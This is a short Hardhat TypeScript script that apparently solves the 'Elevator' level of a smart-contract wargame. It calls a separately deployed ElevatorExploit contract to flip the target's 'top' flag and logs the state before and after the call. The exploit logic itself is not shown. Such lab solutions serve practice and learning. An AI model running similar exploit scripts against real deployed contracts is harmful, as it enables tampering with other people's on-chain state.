import { ethers } from "hardhat"
import { ELEVATOR, ELEVATOREXPLOIT } from "../constants"
import { Elevator, ElevatorExploit } from "../typechain-types"

const exploitVault = async () => {
    const accounts = await ethers.getSigners()
    const elevatorExploit: ElevatorExploit = await ethers.getContractAt(
        "ElevatorExploit",
        ELEVATOREXPLOIT
    )
    const elevator: Elevator = await ethers.getContractAt("Elevator", ELEVATOR)

    console.log("top floor of elevator before", await elevator.top())

    await (await elevatorExploit.changeFloor(0)).wait(1)

    console.log("top floor of elevator after", await elevator.top())
}

exploitVault()
    .then(() => {
        console.log("exploit elevator completed")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
